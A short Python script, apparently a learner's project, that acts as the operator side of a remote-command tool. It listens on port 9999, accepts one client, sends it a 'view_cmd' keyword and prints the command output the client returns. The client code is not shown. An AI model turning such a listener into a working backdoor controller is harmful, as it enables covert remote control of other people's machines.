import os
import socket

s = socket.socket()
# host = socket.gethostname()
host = "0.0.0.0"
port = 9999
s.bind((host,port))
print()
print(" Server is Running " , host)
print()
print("Waiting for incomming connections")
s.listen(5)
conn,addr = s.accept()
print()
print(addr, " connected")

# connection k aage ka kaam

while 1:
    command = input("Command >> ")
    if command=="view_cmd":
        conn.send(command.encode())
        print()
        print("Command sent waiting for execution ")
        print()
        files = conn.recv(5000)
        files = files.decode()
        print("Command executed successfully")
        print("command output" , files)
    else:
        print("Again ")